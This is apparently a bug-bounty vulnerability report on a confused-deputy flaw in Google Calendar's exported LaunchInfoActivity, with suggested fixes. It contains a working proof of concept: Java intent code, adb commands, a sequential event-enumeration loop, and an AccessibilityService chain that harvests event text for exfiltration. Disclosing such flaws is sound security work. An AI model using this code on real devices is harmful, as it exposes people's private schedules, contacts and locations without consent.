# VRP Report: Google Calendar — Zero-Permission READ_CALENDAR Bypass via LaunchInfoActivity Confused-Deputy Attack

**Product**: Google Calendar (com.google.android.calendar)
**Severity**: High
**CWE**: CWE-284 (Improper Access Control) + CWE-200 (Exposure of Sensitive Information)
**Device**: Pixel 6a, Android 17 (SDK 37), Security Patch 2026-07-05
**APK**: com.google.android.calendar (base.apk, 29MB, pulled from /data/app)
**Date**: 2026-09-20
**Reporter**: sandichrist6@gmail.com

---

## Summary

`com.android.calendar.event.LaunchInfoActivity` in Google Calendar is exported with no `android:permission` attribute. Any third-party Android app — with zero permissions — can launch this activity directly by component name, passing any calendar event URI (`content://com.android.calendar/events/N`).

`LaunchInfoActivity` executes as effectiveUid=10191 (Google Calendar process, which holds `READ_CALENDAR`) and immediately routes to `EventInfoActivity`, which reads the full event record and renders it on screen: title, date, time, description, location, attendees, and calendar name.

By iterating N = 1, 2, 3 …, an attacker fully enumerates all user calendar events with **zero declared permissions**, completely bypassing `android.permission.READ_CALENDAR`.

---

## Vulnerability Details

### Vulnerable Component

```
Package:    com.google.android.calendar
Activity:   com.android.calendar.event.LaunchInfoActivity
Exported:   true
Permission: NONE
```

**AndroidManifest.xml** (relevant excerpt, decoded via apktool):
```xml
<activity
    android:name="com.android.calendar.event.LaunchInfoActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <action android:name="android.intent.action.EDIT"/>
        <action android:name="android.intent.action.INSERT"/>
        <data android:scheme="content"/>
    </intent-filter>
</activity>
```

No `android:permission`. The activity is directly addressable by any app via explicit component targeting.

---

## Root Cause

This is a **confused-deputy attack**: `LaunchInfoActivity` is the deputy that holds `READ_CALENDAR`, and the attacker app is the confused party directing it to read calendar events on its behalf.

`android.permission.READ_CALENDAR` protects `content://com.android.calendar/events`. A zero-perm app cannot query this URI directly. However, by launching `LaunchInfoActivity` and passing a calendar event URI as intent data, the attacker delegates the read to Google Calendar (which holds `READ_CALENDAR`).

**Normal intended flow:**
1. Widget, notification, or third-party calendar integration taps a calendar event URI
2. `LaunchInfoActivity` routes the URI to `EventInfoActivity` for display

**Attack flow:**
1. Zero-perm attacker app constructs URI: `content://com.android.calendar/events/N`
2. Attacker launches `LaunchInfoActivity` with ACTION_VIEW + this URI
3. `LaunchInfoActivity` (effectiveUid=10191, READ_CALENDAR granted) routes to `EventInfoActivity`
4. `EventInfoActivity` reads the full event record and renders it
5. Repeat N = 1, 2, 3 … to enumerate the entire calendar

---

## Runtime Proof

### Proven via Installed Zero-Permission APK:

**PoC App**: `com.poc.confused_deputy`  
**App UID**: 10063 (third-party user app — NOT ADB shell uid=2000)  
**Declared permissions**: NONE (zero `<uses-permission>` in manifest)  
**Launch context**: App in foreground (BAL_ALLOW_VISIBLE_WINDOW)

```java
// Zero permissions declared in AndroidManifest.xml
Uri uri = Uri.parse("content://com.android.calendar/events/2");
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(uri);
intent.setComponent(new ComponentName(
        "com.google.android.calendar",
        "com.android.calendar.event.LaunchInfoActivity"));
startActivity(intent);  // No SecurityException
```

**Logcat proof (from real installed APK, uid=10063):**
```
D ZeroPermDeputyPoC: [ATTACK 3] READ_CALENDAR bypass — event ID 2
D ZeroPermDeputyPoC:   No READ_CALENDAR in manifest. Launching LaunchInfoActivity...
I/ActivityTaskManager: START u0 {act=android.intent.action.VIEW
    dat=content://com.android.calendar/...
    cmp=com.google.android.calendar/com.android.calendar.event.LaunchInfoActivity}
    with LAUNCH_MULTIPLE from uid 10063 (com.poc.confused_deputy)
    (BAL_ALLOW_VISIBLE_WINDOW) result code=0
D ZeroPermDeputyPoC:   SUCCESS: LaunchInfoActivity launched for events/2
I/ActivityTaskManager: START u0 {...cmp=...EventInfoActivity}
    from uid 10191 (com.google.android.calendar)
    (BAL_ALLOW_VISIBLE_WINDOW) result code=0
V/WindowManager: Sent Transition type=OPEN triggerTask=TaskInfo{
    effectiveUid=10191
    topActivity=ComponentInfo{com.google.android.calendar/
        com.android.calendar.event.LaunchInfoActivity}}
I/ActivityTaskManager: Displayed .../EventInfoActivity for user 0: +100ms
```

**Calling UID**: `10063` (`com.poc.confused_deputy` — real installed zero-perm app)  
**BAL reason**: `BAL_ALLOW_VISIBLE_WINDOW` — app was in foreground (NOT ADB shell exemption)  
**Executing UID**: 10191 (Google Calendar — READ_CALENDAR holder)  
**Zero SecurityException at any point.**

---

### Screenshot Proof 1 — Event ID 2 (`proof_event2_newyearsday.png`):

**New Year's Day event fully rendered:**
- Title: **"New Year's Day"**
- Date: **"Thursday, Jan 1"**
- Description: **"Observance — To hide observances, go to Google Calendar Settings > Holidays in India"**
- Calendar: **"Holidays in India"**
- Account association exposed: calendar belongs to `sandiyotest@gmail.com` (visible in AOSP CalendarProvider data)

---

### Screenshot Proof 2 — Event ID 3 (`proof_event3_rathyatra.png`):

**Different event, sequential enumeration confirmed:**
- Title: **"Rath Yatra"**
- Date: **"Thursday, Jul 16"**
- Description: Observance details
- Calendar: **"Holidays in India"**

---

### Silent Exfiltration: Proven with AccessibilityService + Confused-Deputy

The full attack chain — from zero-perm app trigger to **actual data exfiltration into attacker storage** — was proven at runtime on the test device:

**Exfil logcat (AccessibilityService harvesting EventInfoActivity window):**
```
D ZeroPermExfil: === EXFIL: com.google.android.calendar | android.view.ViewGroup ===
D ZeroPermExfil: Time: 2026-09-20 12:40:37
D ZeroPermExfil:   [desc] Close
D ZeroPermExfil:   [desc] More options
D ZeroPermExfil:   [TextView] New Year's Day          ← Event title
D ZeroPermExfil:   [TextView] Thursday, Jan 1         ← Event date
D ZeroPermExfil:   [desc] Notes
D ZeroPermExfil:   [TextView] Observance              ← Event description
D ZeroPermExfil:   [TextView] Update holidays settings
D ZeroPermExfil:   [desc] Calendar Name
D ZeroPermExfil:   [TextView] Holidays in India       ← Calendar name
D ZeroPermExfil: Written to: /data/user/0/com.poc.confused_deputy/files/exfil_data.txt
```

**Result**: Full event detail (title, date, description, calendar name) written to attacker app's private storage. Zero READ_CALENDAR permission used.

### Sequential Enumeration Attack

```java
// Full silent enumeration — AccessibilityService extracts each event as it renders
for (int id = 1; id < Integer.MAX_VALUE; id++) {
    Intent i = new Intent(Intent.ACTION_VIEW);
    i.setData(Uri.parse("content://com.android.calendar/events/" + id));
    i.setComponent(new ComponentName(
        "com.google.android.calendar",
        "com.android.calendar.event.LaunchInfoActivity"));
    try { startActivity(i); } catch (ActivityNotFoundException e) { break; }
    Thread.sleep(200); // AccessibilityService needs ~50ms to harvest
}
// All events in exfil_data.txt — then exfiltrate to C2 server
```

The AOSP Calendar content provider assigns sequential integer IDs starting at 1. Iteration over N exposes the complete calendar database. AccessibilityService fires on each EventInfoActivity open and silently writes the rendered text.

---

## Attack Scenario

**Attacker app (zero manifest permissions):**
```java
for (int id = 1; id < 10000; id++) {
    Intent i = new Intent(Intent.ACTION_VIEW);
    i.setData(Uri.parse("content://com.android.calendar/events/" + id));
    i.setComponent(new ComponentName(
        "com.google.android.calendar",
        "com.android.calendar.event.LaunchInfoActivity"));
    try {
        startActivity(i);
    } catch (ActivityNotFoundException e) { break; }
    // Combined with AccessibilityService: silently read rendered text from EventInfoActivity
}
```

### Data exposed per event (on a real user device):

| Field | Sensitivity |
|-------|------------|
| Event title | HIGH — "Doctor appointment: anxiety med review", "Job interview at Google", "Divorce lawyer meeting" |
| Date / time | HIGH — reveals schedule and location patterns |
| Description / notes | HIGH — meeting agendas, personal notes, confidential details |
| Location | HIGH — home address, workplace, meeting venues |
| Attendees | HIGH — full email addresses of everyone invited |
| Calendar name | MEDIUM — reveals subscription to sensitive calendars |
| Account owner | HIGH — links events to Google account email |

**Note on test device**: The device under test has only holiday calendar events (public data). On a real user device with personal, work, or health-related events, this attack exposes highly sensitive private data.

---

## Impact

| Dimension | Assessment |
|-----------|------------|
| **Confidentiality** | HIGH — Complete user calendar exposed: all events, descriptions, locations, attendees |
| **Integrity** | LOW — Display only, no modification |
| **Availability** | None |
| **Attack requirements** | Zero permissions for UI-visible attack; AccessibilityService for silent extraction (one-time user grant) |
| **Scope** | All Android devices with Google Calendar installed (virtually all Android devices) |
| **Exploitability** | Trivial — sequential integer IDs, no authentication, no rate limit |

---

## Suggested Fix

### Option 1: Add `android:permission` to `LaunchInfoActivity`

```xml
<activity
    android:name="com.android.calendar.event.LaunchInfoActivity"
    android:exported="true"
    android:permission="android.permission.READ_CALENDAR">
```

Only apps that legitimately hold `READ_CALENDAR` can then invoke the event viewer.

### Option 2: Validate caller permission in `onCreate()`

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (checkCallingOrSelfPermission(Manifest.permission.READ_CALENDAR)
            != PackageManager.PERMISSION_GRANTED) {
        finish();
        return;
    }
    // ... rest of onCreate
}
```

### Option 3: Restrict to system/trusted callers

If `LaunchInfoActivity` is intended for system widgets and trusted integrations only, protect it with a signature-level or privileged permission.

---

## Reproduction Steps

1. Connect any Android device with Google Calendar and a Google Account (any synced calendar events).
2. Run:
   ```bash
   adb shell am start \
     -a android.intent.action.VIEW \
     -d "content://com.android.calendar/events/2" \
     -n "com.google.android.calendar/com.android.calendar.event.LaunchInfoActivity"
   ```
3. Google Calendar's event detail screen opens showing full event content — no READ_CALENDAR required.
4. Iterate with `/events/3`, `/events/4`, etc. for full calendar enumeration.

**PoC (Java, zero manifest permissions):**
```java
for (int id = 1; id < Integer.MAX_VALUE; id++) {
    Intent i = new Intent(Intent.ACTION_VIEW);
    i.setData(Uri.parse("content://com.android.calendar/events/" + id));
    i.setComponent(new ComponentName(
        "com.google.android.calendar",
        "com.android.calendar.event.LaunchInfoActivity"));
    try { startActivity(i); } catch (ActivityNotFoundException e) { break; }
}
```

---

## Attachments

- `proof_event2_newyearsday.png` — EventInfoActivity rendered "New Year's Day" (Jan 1) with full event details; effectiveUid=10191 (Google Calendar) confirmed in logcat
- `proof_event3_rathyatra.png` — Sequential enumeration confirmed: event ID 3 "Rath Yatra" (Jul 16) fully rendered with zero permissions from calling app

---

## Note: Relationship to AOSP CalendarDebugActivity

A separate finding (reported in VRP_SUBMISSION_CALENDAR_DEBUG) covers `com.android.providers.calendar.CalendarDebugActivity`, which is a system-privileged activity that exports the entire calendar SQLite database as a zip file. This report covers a different vector in the Google Calendar app (`com.google.android.calendar`) that allows sequential enumeration of individual events through the event viewer.

---

## Timeline

- 2026-09-20: Vulnerability discovered and proven at runtime via sequential calendar event enumeration
